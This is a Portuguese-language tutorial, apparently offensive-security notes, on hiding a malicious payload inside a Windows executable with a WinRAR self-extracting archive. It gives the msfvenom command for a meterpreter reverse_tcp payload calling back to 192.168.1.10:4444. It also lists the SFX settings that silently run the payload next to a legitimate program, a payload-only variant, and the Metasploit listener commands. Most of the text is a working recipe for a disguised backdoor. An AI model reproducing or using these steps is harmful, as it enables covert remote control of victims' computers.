## Injecting Payloads em executáveis Windows usando WinRAR (SFX)

Essa técnica usa um **arquivo SFX (Self-Extracting)** do WinRAR para:

1. Extrair arquivos silenciosamente
2. Executar um payload junto com um programa legítimo

Ferramentas:

- WinRAR
- msfvenom

---

# Visão da técnica

Programa legítimo + payload  
           ↓  
Compactar com WinRAR  
           ↓  
Criar SFX  
           ↓  
Executar legítimo + payload

---

# Fase 1 — Gerar payload

msfvenom -p windows/x64/meterpreter/reverse_tcp \  
LHOST=192.168.1.10 \  
LPORT=4444 \  
-f exe -o payload.exe

Agora você tem:

- `payload.exe`
- `legit.exe` (programa legítimo)

---

# Fase 2 — Criar arquivo RAR

Selecione:

payload.exe  
legit.exe

Clique:

Right click → Add to archive

Formato:

RAR

---

# Fase 3 — Configurar SFX

Na janela do WinRAR:

1. Vá em **Advanced**
2. Clique **SFX options**
3. Em **Setup** coloque:

Setup=legit.exe  
Setup=payload.exe

Isso executa os dois.

---

# Fase 4 — Configurações silenciosas

Em **Modes**:

- ✔ Hide all
- ✔ Overwrite all files

Em **Update**:

- ✔ Extract and overwrite

---

# Fase 5 — Nome final

Escolha:

program.exe

Clique **OK** → gera executável SFX.

---

# Fase 6 — Listener no Metasploit

msfconsole  
use exploit/multi/handler  
set payload windows/x64/meterpreter/reverse_tcp  
set LHOST 192.168.1.10  
set LPORT 4444  
run

---

# Fase 7 — Execução

Quando o usuário executar:

1. WinRAR extrai arquivos
2. Executa `legit.exe`
3. Executa `payload.exe`
4. Conexão reversa

---

# Fluxo completo

msfvenom → payload.exe  
      ↓  
WinRAR SFX  
      ↓  
program.exe  
      ↓  
user executa  
      ↓  
legit abre normalmente  
      ↓  
payload executa silencioso  
      ↓  
meterpreter session

---

# Configuração SFX completa (exemplo)

Setup=legit.exe  
Setup=payload.exe  
TempMode  
Silent=1  
Overwrite=1

---

# Variação — Executar apenas payload oculto

Setup=payload.exe  
Silent=1  
TempMode

---

# Vantagens

- Fácil
- Não requer engenharia binária
- Funciona em labs

---

# Limitações

- Detectado por AV moderno
- Executável maior
- Pode mostrar extração

---

# Classificação

|Etapa|Tipo|
|---|---|
|Payload|Initial access|
|SFX|Payload delivery|
|Execução|Exploit|
|Meterpreter|Post-exploitation|